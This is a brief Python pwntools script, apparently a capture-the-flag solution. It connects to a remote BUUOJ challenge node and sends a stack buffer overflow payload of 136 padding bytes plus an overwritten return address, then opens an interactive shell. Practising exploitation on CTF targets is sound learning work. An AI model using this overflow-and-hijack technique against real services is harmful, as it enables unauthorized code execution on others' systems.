from  pwn import *
sh = remote('node5.buuoj.cn', 29405)
buff_addr1 = 0x400596
# buff_addr2 = 0x0000000000400684
sh.sendline(b'A'*(128+8)+p64(buff_addr1))
sh.interactive()